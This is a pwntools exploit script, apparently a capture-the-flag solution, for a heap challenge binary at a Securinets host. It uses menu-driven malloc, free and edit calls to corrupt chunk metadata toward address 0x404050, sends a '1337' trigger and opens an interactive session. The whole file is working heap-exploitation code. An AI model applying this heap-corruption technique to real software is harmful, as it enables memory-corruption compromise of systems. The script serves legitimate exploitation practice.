from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
	if local<2:
		gdb.attach(p,'''

			''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
nc="nc pwned.securinets-tekup.tech 6969"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
	p=remote(host,port)
else:
	p=process([exe.path])

############### helper functions ##############
def send():
	pass

def malloc(size,input):
	p.sendline("1")
	p.recvuntil("Size: ")
	p.sendline(str(size))
	p.recvuntil("Data: ")
	p.sendline(input)

def delete(index):
	p.sendline("2")
	p.recvuntil("Index: ")
	p.sendline(str(index))

def edit(index,input):
	p.sendline("3")
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Data: ")
	p.sendline(input)
############### main exploit    ###############

malloc(0x20,"bbb")

malloc(0x560,"aaaaa")
malloc(0x20,"aaaaa")
malloc(0x550,"aaaaa")
malloc(0x20,"aaaaa")

delete(1)
malloc(0x600,"aaa") # 1 

edit(0,b"a"*0x40+p64(0x404050-0x10)*2)
delete(3)
malloc(0x600,"aaa")

p.sendline("1337")
debug()



p.interactive()